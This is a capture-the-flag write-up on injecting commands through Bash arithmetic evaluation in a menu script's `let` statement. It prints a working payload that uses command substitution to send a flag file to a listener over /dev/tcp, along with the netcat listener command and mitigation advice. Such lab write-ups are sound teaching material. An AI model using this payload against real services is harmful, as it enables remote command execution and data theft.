# Bish Bash Bosh: solving notes

[По-русски](solve.ru.md)

## 1. Task

A small Bash menu asks for a number from 0 through 2 and prints one of three messages, but arithmetic expansion is performed on attacker-controlled input.

Materials: `server.sh`, `Dockerfile`, `entrypoint.sh`, compose; exploit command in evidence.

## 2. Vulnerability

The script runs `read -r i` and then `let i=$i-1`, followed by a bounds check before `cat -- "${files[i]}"`. Bash's arithmetic evaluator interprets input containing array syntax and command substitution; the shell can execute the substitution while evaluating `let`, before the bounds check ever rejects the value. The `files` array even includes `/flag/flag.txt` in its unused first slot, but directly selecting an out-of-range menu entry is not the working method.

## 3. Procedure

1. Inspect `server.sh`: the sensitive operation is `let i=$i-1` with untrusted `i`, not the later `cat`.
2. Open the task's TCP service and wait for `What message would you like to see? (0..2)`.
3. Supply an expression containing command substitution, as captured in the evidence: `x[$(cat /flag/flag.txt > /dev/tcp/<listener>/4444)]`.
4. Start a listener first, e.g. `nc -lvnp 4444`. During the arithmetic evaluation, Bash processes the substitution and sends the file content out over the TCP connection.
5. The menu may reject the malformed expression afterward; that does not undo the earlier substitution. The captured flag was accepted.

## 4. Evidence and result

The archived `server.sh` directly shows the vulnerable `let` and array indexing. The saved exploit command contains the exact command substitution and network exfiltration syntax, plus local probes. The agent marks the task solved.

Result: 1 accepted flag, full string masked (`PP{...}`).

## 5. Reproduction limits

The evidence stores commands rather than a complete combined stdout transcript. We can reproduce the injection logic from the shell script, but the public document masks the listener address and flag.

## 6. Mitigation

Treat arithmetic input as untrusted and parse only decimal digits using a strict format check before use. Avoid dynamically evaluating user strings in Bash arithmetic or array subscripts; use a safe `case` menu.
